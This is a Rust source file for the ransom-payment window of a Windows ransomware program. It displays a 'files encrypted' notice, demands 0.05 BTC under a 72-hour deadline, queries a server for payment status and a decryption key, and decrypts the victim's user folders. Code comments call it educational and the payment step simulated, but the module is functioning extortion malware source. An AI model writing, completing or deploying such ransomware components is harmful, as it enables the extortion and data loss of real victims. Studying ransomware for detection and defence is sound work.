use native_windows_gui as nwg;
use native_windows_derive::NwgUi;
use nwg::NativeUi;
use std::rc::Rc;
use std::cell::RefCell;
use std::sync::{Arc, Mutex};
use sodiumoxide::crypto::box_::PublicKey;

use crate::networking::client::{mark_paid, get_key, check_payment};
use crate::cryptography::decrypt_parallel::decrypt_folder_parallel;
use std::path::PathBuf;
use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Desktop, 
    FOLDERID_Videos, FOLDERID_Pictures, KNOWN_FOLDER_FLAG};

#[derive(Default, NwgUi)]
pub struct PaymentWindow {
    #[nwg_control(size: (620, 640), position: (300, 20), title: "Payment Required", flags: "WINDOW|VISIBLE")]
    #[nwg_events(OnWindowClose: [PaymentWindow::close])]
    window: nwg::Window,

    #[nwg_control(text: "ATTENTION: YOUR FILES HAVE BEEN ENCRYPTED", position: (20, 10), size: (600, 90), flags: "VISIBLE")]
    header: nwg::Label,

    #[nwg_control(text: "", position: (20, 70), size: (600, 440), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
    instructions: nwg::TextBox,

    #[nwg_control(text: "Make Payment", position: (100, 520), size: (200, 50))]
    #[nwg_events(OnButtonClick: [PaymentWindow::make_payment])]
    payment_button: nwg::Button,
    #[nwg_control(text: "Check Payment Status", position: (320, 520), size: (200, 50))]
    #[nwg_events(OnButtonClick: [PaymentWindow::check_status])]
    status_button: nwg::Button,

    #[nwg_control(text: "", position: (20, 580), size: (580, 50), flags: "VISIBLE", readonly: true)]
    status_display: nwg::TextBox,

    #[nwg_control]
    #[nwg_events(OnNotice: [PaymentWindow::on_notice])]
    notice: nwg::Notice,

    status_msg: Arc<Mutex<String>>,

    pub_key: Rc<RefCell<Option<PublicKey>>>,
}

impl PaymentWindow {
    fn close(&self) {
        nwg::stop_thread_dispatch();
    }

    fn make_payment(&self) {
        if let Some(pk) = self.pub_key.borrow().as_ref() {
            self.status_display.set_text("Processing payment... Please wait.");
            
            let pk_clone = pk.clone();
            
            // In reality we would connect here payment processor (bitcoin wallet?)
            // here we just notify the server that payment is made, mark as paid
            tokio::spawn(async move {
                match mark_paid(&pk_clone).await {
                    Ok(_) => {
                        println!("Payment marked on server");
                    },
                    Err(e) => {
                        println!("Failed to mark payment: {}", e);
                    },
                }
            });
            
            self.status_display.set_text("Payment sent! (˶ᵔ ᵕ ᵔ˶) Click 'Check Payment Status' to verify.");
        } else {
            self.status_display.set_text("Error: Unable to process payment. No encryption key found.");
        }
    }

    fn check_status(&self) {
        if let Some(pk) = self.pub_key.borrow().as_ref() {
            self.status_display.set_text("Verifying payment status...");
            
            let pk_clone = pk.clone();

            let notice = self.notice.sender();
            let status_msg = self.status_msg.clone();
            
            tokio::spawn(async move {
                let has_paid = match check_payment(&pk_clone).await {
                    Ok(paid) => paid,
                    Err(e) => {
                        println!("Failed to check payment status: {}", e);
                        return;
                    }
                };
                
                if has_paid {
                    *status_msg.lock().unwrap() = "Good. Oof. Payment verified! Starting decryption...".to_string();
                    notice.notice();

                    match get_key(&pk_clone).await {
                                Ok(secret_key) => {
                                    *status_msg.lock().unwrap() = "Starting file decryption process...".to_string();
                                    notice.notice();
                                    
                                    let paths = [FOLDERID_Music, FOLDERID_Downloads, FOLDERID_Desktop, FOLDERID_Videos, FOLDERID_Pictures];
                                    unsafe {
                                        for path in paths {
                                            if let Ok(path_ptr) = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None) {
                                                let path_str = path_ptr.to_string().unwrap();
                                                let path_buf: PathBuf = path_str.into();
                                                match decrypt_folder_parallel(&path_buf, &pk_clone, &secret_key) {
                                                    Ok(_) => println!("Successfully decrypted: {:?}", path),
                                                    Err(e) => println!("Error decrypting {:?}: {}", path, e),
                                                }
                                            }
                                        }
                                    }
                                    *status_msg.lock().unwrap() = "Oof. Files successfully decrypted!".to_string();
                                    notice.notice();
                                },
                                Err(e) => {
                                    println!("Oops. Error getting decryption key: {}", e);
                                },
                            }
                } else {
                    *status_msg.lock().unwrap() = "Hmm... Payment not confirmed yet. Try again in a moment.".to_string();
                    notice.notice();
                }
            });
            
            self.status_display.set_text("Checking payment status with server...");
        } else {
            self.status_display.set_text("Error, unable to verify payment status.");
        }
    }

    fn on_notice(&self) {
        let msg = self.status_msg.lock().unwrap().clone();
        self.status_display.set_text(&msg);
    }

    pub fn set_public_key(&self, pk: PublicKey) {
        *self.pub_key.borrow_mut() = Some(pk);
    }
}

pub fn show_payment_window(public_key: Option<PublicKey>) {
    nwg::init().expect("Failed to init Native Windows GUI");

    let app = PaymentWindow {
        status_msg: Arc::new(Mutex::new(String::new())),
        ..Default::default()
    };
    
    let ui = PaymentWindow::build_ui(app).expect("Failed to build UI");
    
    // Set the public key if provided
    if let Some(pk) = public_key {
        ui.set_public_key(pk);
    }
    
    // Set the instructions text - looks authentic but is educational
    let instructions_text = 
        "What happened to your files?\r\n\r\n\
        All your important files have been encrypted with military-grade encryption.\r\n\
        Oops ¯\\_(ツ)_/¯\r\n\
        Documents, photos, videos, databases and other files are no longer accessible.\r\n\r\n\
        Can I recover my files?\r\n\
        Yes (˶ᵔ ᵕ ᵔ˶)! We guarantee that you can recover all your files safely.\r\n\
        But you need to pay for the decryption tool.\r\n\r\n\
        How do I pay?\r\n\
        Payment is accepted in Bitcoin only.\r\n\
        Amount: 0.05 BTC (approximately $1000 USD)\r\n\
        Bitcoin Address: 1A2B3C4D5E6F7G8H9111\r\n\r\n\
        After payment:\r\n\
        1. Click 'Make Payment' below\r\n\
        2. Wait for payment confirmation\r\n\
        3. Click 'Check Payment Status' to verify\r\n\
        4. Your files will be automatically decrypted\r\n\r\n\
        WARNING: You have 72 hours to pay. After this deadline,\r\n\
        the decryption key will be permanently deleted.\r\n\r\n\
        Do not modify or delete encrypted files as this may\r\n\
        make recovery impossible.";
    
    ui.instructions.set_text(instructions_text);
    
    // Set header font and styling 
    let mut font = nwg::Font::default();
    nwg::Font::builder()
        .family("Arial")
        .size(18)
        .weight(700)
        .build(&mut font)
        .expect("Failed to build font");
    ui.header.set_font(Some(&font));
    
    ui.status_display.set_text("Ready! Follow the instructions above to get your files back. Good luck.");
    
    nwg::dispatch_thread_events();
}